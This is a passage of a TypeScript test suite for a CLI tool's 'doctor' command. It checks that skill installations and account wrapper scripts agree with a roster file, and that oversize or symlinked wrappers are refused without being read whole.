    for (const name of ['wrappers', 'accounts', 'memory', 'routing', 'pools', 'skills', 'history']) {
      expect(r.stdout).toMatch(new RegExp(`^SKIP ${name}: this box records CCRC_ROLE=server, so it hosts no sessions`, 'm'));
      expect(r.stdout, `${name} still printed a verdict on a server-role box`).not.toMatch(new RegExp(`^(PASS|WARN|FAIL) ${name}:`, 'm'));
    }
  });

  it('skips, never passes vacuously, when the roster names no home that exists on this box', () => {
    const home = healthy('ccrc-doctor-skills-nohome-');
    rmSync(join(home, '.claude'), { recursive: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP skills: none of the roster's config directories exist/m);
  });

  it('names EVERY skill the shipped tree lacks in one FAIL, not the first it meets (R19)', () => {
    const home = healthy('ccrc-doctor-skills-notree-two-');
    rmSync(join(home, 'ccrc', 'ccd', 'reviewer-skill'));
    rmSync(join(home, 'ccrc', 'ccd', 'worker-skill'));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL skills: the shipped tree has no .*worker-skill.*, .*reviewer-skill/m);
    expect((r.stdout.match(/^FAIL skills:/mg) ?? []).length).toBe(1);
  });

  it('a roster whose every row is unusable SKIPs in its own words — not as "no config directory exists" (R19)', () => {
    // Two conditions used to wear one SKIP sentence: no rostered home exists
    // on this box, and no roster row survived the reader (a malformed id or
    // configDirSuffix). The second is the wrappers check's finding; this one
    // now hands off by name instead of blaming directories that were never
    // looked for.
    const home = healthy('ccrc-doctor-skills-norows-');
    writeRoster(home, [{ id: 'Bad Id!', configDirSuffix: '.claude', exec: { kind: 'upstream' } } as unknown as RosterEntry]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^SKIP skills: no usable account in \$HOME\/\.ccrc\/accounts\.json — the 'wrappers' check above owns that$/m);
    expect(r.stdout).not.toMatch(/^SKIP skills: none of the roster's config directories exist/m);
  });

  it('doctor --fix CURES a stale home from the shipped tree and re-measures it: FIX line, then PASS, exit 0 (R19)', () => {
    const home = healthy('ccrc-doctor-skills-fix-');
    const f = join(installed(home, '.claude', 'ccrc-reviewer'), 'SKILL.md');
    const shipped = readFileSync(join(home, 'ccrc', 'ccd', 'reviewer-skill', 'SKILL.md'), 'utf8');
    writeFileSync(f, shipped.replace('$HOME/.cc-clips/', '$WT/.ccrc-review/'));
    rmSync(installed(home, '.claude', 'ccrc-worker'), { recursive: true });
    // H-133: the fourth installer is cured too, so a `history` arm dropped from `_fix_skills` is a red here.
    rmSync(installed(home, '.claude', 'ccrc-history'), { recursive: true });
    // Without --fix: the verdict stands and nothing is written.
    let r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).not.toMatch(/^FIX /m);
    expect(readFileSync(f, 'utf8')).not.toBe(shipped);
    // With --fix: the fixer runs the shipped tree's own installers into the
    // rostered homes, says so, and the check is measured AGAIN — the PASS is a
    // re-measurement, never a promise. The installers are bash scripts that
    // call these coreutils; the contained PATH carries none of them by design,
    // and a box's PATH carries all of them.
    for (const t of ['rm', 'mkdir', 'mv', 'cp', 'date', 'basename']) linkReal(home, t);
    r = runDoctor(home, ['doctor', '--fix']);
    expect(r.stdout).toMatch(/^FAIL skills: 3 skill\(s\) in the rostered homes/m);
    const skillsLines = r.stdout.split('\n').filter((l) => /^(FAIL|FIX|PASS|SKIP) skills|^  remedy/.test(l)).join('\n');
    expect(skillsLines).toMatch(/^FIX skills: re-ran the shipped tree's installers into 1 home\(s\)/m);
    expect(r.stdout).toMatch(/^PASS skills: 1\/1 homes carry the shipped/m);
    expect(r.code, r.stdout).toBe(0);
    expect(readFileSync(f, 'utf8')).toBe(shipped);
    expect(existsSync(join(installed(home, '.claude', 'ccrc-worker'), 'SKILL.md'))).toBe(true);
    expect(existsSync(join(installed(home, '.claude', 'ccrc-history'), 'SKILL.md'))).toBe(true);
    // The summary counts the RE-measured verdict: no failed line survives.
    expect(r.stdout).toMatch(/ 0 failed$/m);
  });

  it('doctor --fix on a healthy box prints no FIX line and changes nothing; an unknown flag is still a usage refusal', () => {
    const home = healthy('ccrc-doctor-fix-healthy-');
    const r = runDoctor(home, ['doctor', '--fix']);
    expect(r.code, r.stdout).toBe(0);
    expect(r.stdout).not.toMatch(/^FIX /m);
    const bad = runDoctor(home, ['doctor', '--repair']);
    expect(bad.code).toBe(2);
  });

  it('fails when the shipped tree itself lacks a skill — nothing says what "installed" should mean', () => {
    const home = healthy('ccrc-doctor-skills-notree-');
    rmSync(join(home, 'ccrc', 'ccd', 'reviewer-skill'));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL skills: the shipped tree has no .*reviewer-skill/m);
  });

  it('fails when the shipped tree lacks the history skill: the notree loop names it, not the per-home diff (H-133)', () => {
    const home = healthy('ccrc-doctor-skills-notree-history-');
    rmSync(join(home, 'ccrc', 'ccd', 'history-skill'), { recursive: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL skills: the shipped tree has no .*history-skill/m);
    expect((r.stdout.match(/^FAIL skills:/mg) ?? []).length).toBe(1);
  });
});


// ── the roster against the wrappers on disk ───────────────────────────────
// Task 5. Deliberately stronger than the spec's "wrappers present and
// executable", because presence was never the failure mode: D-69 is a wrapper
// that is present, executable, and sourcing a secrets file its roster entry
// does not mention — which is invisible to every check that only stats a file.

describe('ccrc doctor: wrappers', () => {
  it('fails when a generated account declares no secretsFile but its wrapper sources one', () => {
    // D-69, reproduced as a fixture: the exact live shape on the fleet host,
    // where `claude-acme` is `{"kind":"generated"}` and its wrapper really does
    // source .cc-secrets/claude-acme-oauth.env.
    const home = healthy('ccrc-doctor-wrappers-d69-');
    writeWrapper(home, 'acct-a', { cfgDir: '.acct-a', secrets: '.cc-secrets/acct-a.env' });
    writeRoster(home, [{ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } }]);
    const r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/FAIL wrappers: acct-a/);
    expect(r.stdout).toMatch(/sources \.cc-secrets\/acct-a\.env.*roster declares none/);
  });

  it('fails the other direction too — the roster declares a secretsFile the wrapper does not source', () => {
    const home = healthy('ccrc-doctor-wrappers-reverse-');
    writeWrapper(home, 'acct-a', { cfgDir: '.acct-a' });                    // no secrets line
    writeRoster(home, [{
      id: 'acct-a', configDirSuffix: '.acct-a',
      exec: { kind: 'generated', secretsFile: '.cc-secrets/acct-a.env' },
    }]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/FAIL wrappers: acct-a/);
    // The SENTENCE, not just the path: "acct-a sources  but the roster declares
    // …" is what a single catch-all comparison produces, and a verdict with a
    // hole in it is a verdict an operator has to guess at. Measured — deleting
    // this direction's own branch left every looser assertion green.
    expect(r.stdout).toMatch(/acct-a sources no secrets file but the roster declares \.cc-secrets\/acct-a\.env/);
    expect(r.code).toBe(1);
  });

  it('fails the THIRD way too — both name a secrets file and they are different files', () => {
    // The arm the whole-branch review found unpinned, and the one a real box
    // reaches by the most ordinary route there is: somebody renamed the
    // credentials file and updated one side. Measured before the fix — with
    // this arm deleted the suite was 169/169 GREEN and doctor answered
    // `PASS wrappers: 2 accounts … match`, which is a wrapper loading
    // credentials nobody wrote down reported as a healthy box.
    //
    // The two paths are a NEAR MISS on purpose (the live shape is
    // `claude-acme-oauth.env`): unrelated names would also pass a comparison
    // that had been loosened to a prefix or substring test.
    const home = healthy('ccrc-doctor-wrappers-secrets-differ-');
    writeWrapper(home, 'acct-a', { cfgDir: '.acct-a', secrets: '.cc-secrets/acct-a.env' });
    writeRoster(home, [{
      id: 'acct-a', configDirSuffix: '.acct-a',
      exec: { kind: 'generated', secretsFile: '.cc-secrets/acct-a-oauth.env' },
    }]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(
      /acct-a sources \.cc-secrets\/acct-a\.env but the roster declares \.cc-secrets\/acct-a-oauth\.env/);
    // BOTH paths, and the roster's one named rather than called "none": an
    // operator has to know which of the two files to go and look at, and this
    // arm collapsing into the first one's wording would say something false
    // about a roster that does declare a file.
    expect(r.stdout).not.toMatch(/acct-a sources .* but the roster declares none/);
    expect(r.code).toBe(1);
  });

  it('fails when a roster account has no wrapper at all', () => {
    const home = healthy('ccrc-doctor-wrappers-ghost-');
    writeRoster(home, [{ id: 'ghost', exec: { kind: 'generated' } }]);
    const r = runDoctor(home);
    expect(r.code).toBe(1);
    // `$HOME` as written, not as resolved: it is how the wrapper spells its own
    // paths, so the operator can grep for the same string.
    expect(r.stdout).toMatch(/FAIL wrappers: ghost .*no executable at \$HOME\/\.local\/bin\/ghost/);
  });

  // ── D-82: absent is not disagreement ────────────────────────────────────
  // "nothing exists on disk for `ccrc wrappers` to refuse" and "the roster and
  // the wrapper on disk describe two different things" are two findings an
  // operator fixes with two different commands — `ccrc wrappers` writes the
  // first kind from nothing, but does not touch a file `ccrc wrappers` would
  // itself refuse to overwrite, so pointing an absent-wrapper operator at "make
  // the roster and the wrapper agree" sends them looking for a wrapper that was
  // never written in the first place.
  it('fails an absent generated wrapper with the ccrc-wrappers remedy, not the roster-sync one (D-82)', () => {
    // MEASURED RED (before the split): `_dr_wr_present` appended the absent
    // finding to `wr_hard` same as every disagreement, so the FAIL's remedy
    // was the generic "the roster is the source of truth … 'ccrc adopt
    // --out /tmp/accounts.json' prints what a rediscovery from disk would
    // say" sentence — the wrong instruction for an account nothing on disk
    // has ever tried to be.
    const home = healthy('ccrc-doctor-wrappers-absent-remedy-');
    writeRoster(home, [{ id: 'ghost', exec: { kind: 'generated' } }]);
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL wrappers: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toMatch(/ghost has no executable at \$HOME\/\.local\/bin\/ghost/);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: run: ccrc wrappers/);
    expect(lines[i + 1]).not.toMatch(/ccrc adopt/);
    expect(r.code).toBe(1);
  });

  it('reports an absent wrapper and a disagreeing one as two separate FAIL lines, each its own remedy (D-82)', () => {
    // MEASURED RED (before the split): one bucket, one `_dr_join`, one FAIL
    // line carrying both sentences ("ghost has no executable …; acct-a's
    // wrapper sets CLAUDE_CONFIG_DIR to .somewhere-else but the roster
    // declares .acct-a") and one remedy — the roster-sync sentence, wrong for
    // the absent half. `failIdx.length` was 1, not 2.
    //
    // MUTATION MEASURED (Step 5): re-merging `wr_absent` into `wr_hard` in the
    // working tree (both `_dr_wr_present` call sites passing `wr_hard`, and
    // dropping the `wr_absent` verdict block) turned this test and the one
    // above RED again, byte-identical to the pre-fix failures above — same
    // combined FAIL sentence, same wrong remedy, `failIdx.length` back to 1.
    // Reverted after the measurement; both tests are green against the
    // restored split.
    const home = healthy('ccrc-doctor-wrappers-absent-and-hard-');
    // ghost: generated, declared, nothing on disk at all — the ABSENT class.
    writeWrapper(home, 'acct-a', { cfgDir: '.somewhere-else' });
    writeRoster(home, [
      { id: 'ghost', exec: { kind: 'generated' } },
      // acct-a: generated, present, but its wrapper's CLAUDE_CONFIG_DIR
      // disagrees with the roster's configDirSuffix — the DISAGREEMENT class.
      { id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } },
    ]);
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const failIdx = lines.reduce<number[]>((acc, l, idx) => {
      if (l.startsWith('FAIL wrappers: ')) acc.push(idx);
      return acc;
    }, []);
    expect(failIdx.length, r.stdout).toBe(2);
    const [absentIdx, hardIdx] = failIdx;
    // The absent line comes FIRST — the verdict assembly's own ordering.
    expect(lines[absentIdx]).toMatch(/ghost has no executable at \$HOME\/\.local\/bin\/ghost/);
    expect(lines[absentIdx + 1]).toMatch(/^ {2}remedy: run: ccrc wrappers/);
    expect(lines[hardIdx]).toContain('acct-a');
    expect(lines[hardIdx]).toMatch(/\.somewhere-else.*\.acct-a/);
    // The DISAGREEMENT remedy stays the verbatim roster sentence (the pin at
    // ccrc-doctor-checks:1012 / the "keeps a soft finding OFF the FAIL line"
    // test above) — the split must not have touched wr_hard's own wording.
    expect(lines[hardIdx + 1]).toMatch(/^ {2}remedy: the roster is the source of truth/);
    expect(r.code).toBe(1);
  });

  it('describes the account it is talking about, not whichever one came last in the roster', () => {
    // The finding names an id AND describes a file; both have to be the same
    // account. A `local dir="$1" id="$2" p="…/$id"` builds `p` from the
    // CALLER's `id` — bash expands the whole `local` before any name becomes
    // local — so the missing account got measured against the LAST roster
    // entry's wrapper and was reported with the wrong sentence. Invisible
    // whenever the missing account happens to be last, which is why this
    // fixture puts a real, present wrapper after it.
    const home = healthy('ccrc-doctor-wrappers-wrong-account-');
    writeSymlinkWrapper(home, 'zz-last', 'zz-bespoke');
    writeRoster(home, [
      { id: 'ghost', exec: { kind: 'generated' } },
      { id: 'zz-last', exec: { kind: 'external' } },
    ]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/ghost has no executable at \$HOME\/\.local\/bin\/ghost/);
    expect(r.stdout).not.toMatch(/ghost is declared generated but/);
  });

  it('fails when the wrapper points at a config dir the roster does not declare', () => {
    const home = healthy('ccrc-doctor-wrappers-cfgdir-');
    writeWrapper(home, 'acct-a', { cfgDir: '.somewhere-else' });
    writeRoster(home, [{ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } }]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/FAIL wrappers: acct-a/);
    expect(r.stdout).toMatch(/\.somewhere-else.*\.acct-a/);
    expect(r.code).toBe(1);
  });

  it('fails when a generated wrapper execs something other than the roster\'s upstream account', () => {
    const home = healthy('ccrc-doctor-wrappers-target-');
    writeWrapper(home, 'acct-a', { target: 'some-other-binary' });
    writeRoster(home, [{ id: 'acct-a', exec: { kind: 'generated' } }]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/FAIL wrappers: acct-a/);
    expect(r.stdout).toMatch(/some-other-binary/);
    expect(r.code).toBe(1);
  });

  it('leaves an external account alone — ccrc records it and never touches it', () => {
    // `gpt` on the reference box is a symlink to a bespoke script. It has no
    // generated shape and must not be reported as broken for lacking one — nor
    // may its symlink TARGET be reported as an account of its own.
    const home = healthy('ccrc-doctor-wrappers-external-');
    writeSymlinkWrapper(home, 'ext-a', 'bespoke-tool');
    writeRoster(home, [{ id: 'ext-a', exec: { kind: 'external' } }]);
    const r = runDoctor(home);
    expect(r.stdout).not.toMatch(/ext-a/);
    expect(r.stdout).not.toMatch(/bespoke-tool/);
    expect(lineFor(r.stdout, 'wrappers')).toMatch(/^PASS wrappers: /);
  });

  it('passes when the upstream account is a non-script binary, which is its normal shape', () => {
    const home = healthy('ccrc-doctor-wrappers-upstream-');
    writeBinary(home, 'up');                       // the real claude is a 300MB ELF
    writeRoster(home, [{ id: 'up', exec: { kind: 'upstream' } }]);
    const r = runDoctor(home);
    expect(r.stdout).not.toMatch(/FAIL wrappers/);
    expect(r.code).toBe(0);
  });

  it('names what it measured when everything agrees, never the bare word "ok"', () => {
    const home = healthy('ccrc-doctor-wrappers-ok-');
    writeWrapper(home, 'acct-a', { secrets: '.cc-secrets/acct-a.env' });
    writeRoster(home, [{
      id: 'acct-a', exec: { kind: 'generated', secretsFile: '.cc-secrets/acct-a.env' },
    }]);
    const line = lineFor(runDoctor(home).stdout, 'wrappers');
    expect(line).toMatch(/^PASS wrappers: /);
    expect(line).toMatch(/2 accounts/);
    expect(line).toContain('accounts.json');
  });

  itCodex('a correctly installed Codex lane passes the wrappers check and reports its one lane', async () => {
    const home = await healthyCodexBox('ccrc-doctor-wrappers-codex-healthy-');
    const r = runDoctor(home);
    const line = lineFor(r.stdout, 'wrappers');
    expect(line, r.stdout).toMatch(/^PASS wrappers: /);
    expect(line).toMatch(/\(1 upstream, 0 generated, 0 external, 1 Codex\)$/);
    expect(r.code).toBe(0);
  });

  itCodex('a Codex launcher execing the upstream account instead of ccrc-codex fails and names both', async () => {
    const home = await healthyCodexBox('ccrc-doctor-wrappers-codex-target-');
    writeWrapper(home, 'codex-a', { cfgDir: '.claude-codex-a', target: 'claude' });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(
      /FAIL wrappers: codex-a's wrapper execs \$HOME\/\.local\/bin\/claude, not ccrc-codex/);
    expect(r.code).toBe(1);
  });

  itCodex('a Codex launcher execing ccgpt — another repository\'s launcher on the fleet box — fails and names ccrc-codex (D-3478)', async () => {
    // The one wrong target that LOOKS right: Plan 1 shipped `ccgpt` as the
    // expected value, and on the fleet box that name is another repository's
    // live launcher, which picks its own first lane when none is named.
    const home = await healthyCodexBox('ccrc-doctor-wrappers-codex-ccgpt-');
    writeWrapper(home, 'codex-a', { cfgDir: '.claude-codex-a', target: 'ccgpt' });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(
      /FAIL wrappers: codex-a's wrapper execs \$HOME\/\.local\/bin\/ccgpt, not ccrc-codex/);
    expect(r.code).toBe(1);
  });

  itCodex('the launcher the writer generates for a Codex lane passes — writer and checker name one target', async () => {
    // The literal cases above pin each side's spelling; this pins that the two
    // sides AGREE, through the real writer, so renaming one side alone reds here.
    const { generateWrapperBody } = await import('../../shared/wrapper.mjs');
    const { markGenerated } = await import('../../shared/mark.mjs');
    const home = await healthyCodexBox('ccrc-doctor-wrappers-codex-writer-');
    writeFileSync(join(binDir(home), 'codex-a'), markGenerated(generateWrapperBody(
      { id: 'codex-a', configDirSuffix: '.claude-codex-a', execKind: 'codex' }, 'claude')), { mode: 0o755 });
    const r = runDoctor(home);
    expect(lineFor(r.stdout, 'wrappers'), r.stdout).toMatch(/^PASS wrappers: /);
    expect(r.code).toBe(0);
  });

  itCodex('an absent Codex launcher fails in the absent bucket with the ccrc-wrappers remedy', async () => {
    const home = await healthyCodexBox('ccrc-doctor-wrappers-codex-absent-');
    rmSync(join(binDir(home), 'codex-a'), { force: true });
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL wrappers: '));
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toMatch(/codex-a has no executable at \$HOME\/\.local\/bin\/codex-a/);
    expect(lines[i + 1]).toMatch(/^ {2}remedy: run: ccrc wrappers/);
    expect(lines[i + 1]).toMatch(/writes every generated and Codex account's wrapper/);
    expect(r.code).toBe(1);
  });

  it('WARNS about a wrapper on disk the roster describes nowhere — reported, never resolved', () => {
    // adopt's bias rule (ccrc-adopt:41-48), carried over: the ambiguous case is
    // REPORTED. It is not a FAIL — keeping a launcher the fleet does not drive
    // is a legitimate thing to do — but a silent pass would hide the account
    // that was added to disk and never written down.
    const home = healthy('ccrc-doctor-wrappers-undeclared-');
    writeWrapper(home, 'stray', { cfgDir: '.stray' });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^WARN wrappers: .*stray/m);
    expect(r.code).toBe(0);
  });

  it('does not count a symlink alias of a declared wrapper as a second account', () => {
    // The measured shape: `gpt -> ccgpt`, both in ~/.local/bin, one file. The
    // alias is not an undeclared account, and saying it is would make the WARN
    // above fire on every box that has one.
    const home = healthy('ccrc-doctor-wrappers-alias-');
    writeSymlinkWrapper(home, 'ext-a', 'ccgpt-like');
    writeRoster(home, [{ id: 'ext-a', exec: { kind: 'external' } }]);
    expect(runDoctor(home).stdout).not.toMatch(/ccgpt-like/);
  });

  it('fails when this box has no roster at all, rather than reporting agreement nobody measured', () => {
    const home = healthy('ccrc-doctor-wrappers-noroster-');
    rmSync(join(home, '.ccrc', 'accounts.json'), { force: true });
    const r = runDoctor(home);
    // "absent" and "there is something there but it is not a file" are two
    // conditions an operator acts on differently, so the message is asserted,
    // not just the FAIL: measured, deleting the absent branch left the file's
    // NEXT guard answering for it with the wrong sentence, and every looser
    // assertion stayed green.
    expect(r.stdout).toMatch(/^FAIL wrappers: no account roster at \$HOME\/\.ccrc\/accounts\.json/m);
    expect(r.code).toBe(1);
  });

  it('refuses a roster with zero accounts rather than reporting agreement nobody measured', () => {
    // A scan over an empty list passes everything — this suite's own recurring
    // failure mode, and the reason `runs every check in the table` exists.
    const home = healthy('ccrc-doctor-wrappers-empty-');
    writeFileSync(join(home, '.ccrc', 'accounts.json'), JSON.stringify({ version: 1, accounts: [] }));
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL wrappers: .*zero accounts/m);
    expect(r.code).toBe(1);
  });

  it('a secrets guard that TESTS one path and SOURCES another is not the generated shape', () => {
    // The bug class `_wrap_parse_shape` reconstructs-and-compares to avoid
    // (ccrc-wrapper-shape, "EACH SIGNIFICANT LINE IS CHECKED BY STRIPPING"): a
    // regex capturing two occurrences of the same path in one line silently
    // accepts a MISMATCHED pair, and a wrapper that guards on a file it does
    // not load is a wrapper that starts unauthenticated with no error at all.
    const home = healthy('ccrc-doctor-wrappers-mismatched-pair-');
    writeFileSync(join(binDir(home), 'acct-a'), [
      '#!/usr/bin/env bash',
      'export CLAUDE_CONFIG_DIR="$HOME/.acct-a"',
      '[ -r "$HOME/.cc-secrets/acct-a.env" ] && . "$HOME/.cc-secrets/OTHER.env"',
      'exec "$HOME/.local/bin/claude" "$@"',
      '',
    ].join('\n'), { mode: 0o755 });
    writeRoster(home, [{
      id: 'acct-a', configDirSuffix: '.acct-a',
      exec: { kind: 'generated', secretsFile: '.cc-secrets/acct-a.env' },
    }]);
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/FAIL wrappers: acct-a .*not the generated wrapper shape/);
    expect(r.code).toBe(1);
  });

  // D-81, the doctor side. `_wrap_parse_shape` (ccd/ccrc-wrapper-shape) reads
  // a candidate WHOLE (`mapfile -t lines < "$f"`) — unlike `_wrap_is_script`'s
  // two-byte gate, it has no bound at all. `ccrc wrappers` never asks it about
  // a genuinely oversize file post-D-81 (`deploy/gen-wrappers.mjs` classifies
  // one `oversize` before bash ever sees the disk path), but `_check_wrappers`
  // is a pure-bash roster-vs-disk comparison with no node-side gate ahead of
  // it, so it needs its own.
  //
  // The fixture starts with a real shebang and a real, EARLY, correctly
  // terminated `export CLAUDE_CONFIG_DIR=` line — so `_wrap_is_script` and
  // `_wrap_declares_config_dir` (the `wr_cands` scan, both cheap: the match is
  // found on line 2, before either reads a byte of the padding) admit it into
  // `wr_seen`, and the shape loop reaches it — then a SPARSE tail
  // (`ftruncateSync`, no real disk cost) pushes the file well past 1 MiB.
  // Without the gate, `_wrap_parse_shape` answers `no` too (the padding makes
  // `body` the wrong length), so a bare "REFUSE"-shaped assertion would not
  // distinguish "fixed" from "unfixed" — the SENTENCE is the pin, because it
  // is the one thing that changes: "over 1 MiB … never read" only appears once
  // the size gate exists to say it, in place of the generic "not the generated
  // shape" wording the unbounded read would otherwise reach.
  //
  // The gate is `command -v stat`-guarded (this file's own `df`/`git`/`gh`
  // idiom), and `healthy()`'s fixture PATH has no real coreutils at all — so
  // this test links the box's REAL `stat` in, the same way `linkReal(home,
  // 'timeout')`/`linkReal(home, 'jq')` do elsewhere in this file for a check
  // that genuinely needs the real tool. Every OTHER wrapper test in this file
  // runs with no `stat` on PATH and is unaffected by this change: the guard's
  // fallback (fall through to the pre-D-81 unbounded read) is exactly what
  // every pre-existing green test already exercises, which is why none of
  // them needed to change.
  it('an oversize wrapper candidate fails with its own sentence, never read whole (D-81)', () => {
    const home = healthy('ccrc-doctor-wrappers-oversize-');
    linkReal(home, 'stat');
    const p = join(binDir(home), 'acct-a');
    const fd = openSync(p, 'w');
    try {
      const header = '#!/usr/bin/env bash\nexport CLAUDE_CONFIG_DIR="$HOME/.acct-a"\n';
      writeSync(fd, header, 0, 'utf8');
      ftruncateSync(fd, 1024 * 1024 + header.length + 1); // over 1 MiB, sparse
    } finally {
      closeSync(fd);
    }
    chmodSync(p, 0o755);
    writeRoster(home, [{ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } }]);
    const r = runDoctor(home);
    expect(r.code).toBe(1);
    expect(r.stdout).toMatch(/FAIL wrappers: acct-a's \$HOME\/\.local\/bin\/acct-a is over 1 MiB/);
    expect(r.stdout).toMatch(/never read/);
    expect(r.stdout).not.toMatch(/not the generated shape/);
  });

  // D-160, recorded on 2026-08-21 and fixed here. The gate above measured the
  // LINK, not the target: `stat -c%s` without `-L` answers the length of the
  // target-path STRING for a symlink. Measured live on the fleet box at the
  // time: `stat -c%s gpt` = 33 while the `ccgpt` behind it is 7.8 KB.
  //
  // So a wrapper that is a symlink to a huge file sailed through the size gate
  // and was then `mapfile`d whole by `_wrap_parse_shape` — reintroducing
  // exactly the unbounded read D-81 added the gate to close, through the one
  // shape the gate could not see. `ccd/ccrc-adopt`'s own scans have always used
  // `stat -L`; this one did not, and nothing said so.
  //
  // Symlinked wrappers are not hypothetical here: `~/.local/bin` is where the
  // upstream launcher and every account wrapper live side by side, and linking
  // one to another is the ordinary way a box gets a second name for a binary.
  it('measures a symlinked wrapper by its TARGET, not the link (D-160)', () => {
    const home = healthy('ccrc-doctor-wrappers-symlink-oversize-');
    linkReal(home, 'stat');
    // The oversize file lives OUTSIDE bin/, so the only thing the scan can see
    // in `~/.local/bin` is the link — which is the whole point. A copy in bin/
    // would be found by the plain `stat` too and prove nothing.
    const target = join(home, 'big-wrapper');
    const fd = openSync(target, 'w');
    try {
      const header = '#!/usr/bin/env bash\nexport CLAUDE_CONFIG_DIR="$HOME/.acct-a"\n';
      writeSync(fd, header, 0, 'utf8');
      ftruncateSync(fd, 1024 * 1024 + header.length + 1); // over 1 MiB, sparse
    } finally {
      closeSync(fd);
    }
    chmodSync(target, 0o755);
    symlinkSync(target, join(binDir(home), 'acct-a'));
    writeRoster(home, [{ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } }]);
    const r = runDoctor(home);
    expect(r.code).toBe(1);
    // Same pin as the plain-file case above, and for the same reason: without
    // the gate `_wrap_parse_shape` also answers `no`, so only the SENTENCE
    // distinguishes "refused after measuring" from "refused after reading it
    // all". A link whose target-path string is short enough would otherwise
    // reach the generic wording.
    expect(r.stdout).toMatch(/FAIL wrappers: acct-a's \$HOME\/\.local\/bin\/acct-a is over 1 MiB/);
    expect(r.stdout).toMatch(/never read/);
    expect(r.stdout).not.toMatch(/not the generated shape/);
  });

  it('a roster that does not parse is its own answer, not "no roster"', () => {
    const home = healthy('ccrc-doctor-wrappers-badjson-');
    writeFileSync(join(home, '.ccrc', 'accounts.json'), 'not json at all');
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL wrappers: .*does not parse/m);
    expect(r.stdout).not.toMatch(/no account roster/);
  });

  it('fails loudly, and names the file, when the wrapper-shape library did not ship', () => {
    // THE THIRD FILE. `ccrc` reaches its siblings through `${BASH_SOURCE[0]}`,
    // which bash does not resolve through a symlink, so `ccrc`,
    // `ccrc-doctor-checks` and `ccrc-wrapper-shape` must be installed into one
    // directory together. This is that requirement as a mechanism rather than a
    // sentence in a report.
    const home = healthy('ccrc-doctor-wrappers-nolib-');
    rmSync(join(home, 'ccrc', 'ccd', 'ccrc-wrapper-shape'), { force: true });
    const r = runDoctor(home);
    expect(r.stdout).toMatch(/^FAIL wrappers: .*ccrc-wrapper-shape/m);
    expect(r.code).toBe(1);
  });

  // ── two classes of finding, two verdict lines ───────────────────────────
  // The reference box's own reading: one real defect (D-69) plus two launchers
  // somebody keeps on purpose. Joined into one FAIL sentence that read as three
  // defects, told the operator to reconcile the roster with launchers that are
  // not accounts, threw away the remedy that belonged to them, and let the
  // summary print `0 warned` with warn-class findings on the screen.
  /** The two-class fixture: a hard finding (D-69) and a soft one (an
   *  undeclared launcher) in the same run. */
  function twoClasses(prefix: string): string {
    const home = healthy(prefix);
    writeWrapper(home, 'acct-a', { cfgDir: '.acct-a', secrets: '.cc-secrets/acct-a.env' });
    writeWrapper(home, 'stray', { cfgDir: '.stray' });
    writeRoster(home, [{ id: 'acct-a', configDirSuffix: '.acct-a', exec: { kind: 'generated' } }]);
    return home;
  }

  it('keeps a soft finding OFF the FAIL line — a launcher nobody declared is not a defect', () => {
    const home = twoClasses('ccrc-doctor-wrappers-two-classes-fail-');
    const lines = runDoctor(home).stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('FAIL wrappers: '));
    expect(i, lines.join('\n')).toBeGreaterThan(-1);
    expect(lines[i]).toContain('acct-a sources .cc-secrets/acct-a.env');
    // THE PIN: the soft finding must not be laundered into the FAIL sentence.
    expect(lines[i]).not.toContain('stray');
    // …nor may the FAIL's remedy be the soft one's. "Make the roster and the
    // wrapper agree" is the wrong instruction for a deliberate launcher.
    expect(lines[i + 1]).toMatch(/^ {2}remedy: the roster is the source of truth/);
  });

  it('still reports the soft findings when a hard one is present — its own line, its own remedy', () => {
    const home = twoClasses('ccrc-doctor-wrappers-two-classes-warn-');
    const r = runDoctor(home);
    const lines = r.stdout.split('\n');
    const i = lines.findIndex((l) => l.startsWith('WARN wrappers: '));
    // THE OTHER PIN: dropping the soft findings whenever a hard one exists is
    // silent, and silence is the failure mode this check exists to end.
    expect(i, r.stdout).toBeGreaterThan(-1);
    expect(lines[i]).toContain('stray');
    expect(lines[i]).not.toContain('acct-a');
    expect(lines[i + 1]).toMatch(/^ {2}remedy: either describe it/);
    expect(r.code).toBe(1);          // the worse class still decides the exit
  });

  it('counts BOTH lines in the summary — a run with a warning does not say "0 warned"', () => {
    // The count is over verdict LINES, so a check that answered in two classes
    // is counted in both and the totals may exceed the number of checks. That
    // is the honest shape: it is what happened.
    const home = twoClasses('ccrc-doctor-wrappers-two-classes-summary-');
    const r = runDoctor(home);
    const last = r.stdout.split('\n').filter(Boolean).pop() ?? '';
    const m = /^summary: (\d+) checks \((\d+) skipped\), (\d+) verdicts — (\d+) passed, (\d+) warned, (\d+) failed$/.exec(last);
    expect(m, `last line was: ${last}`).toBeTruthy();
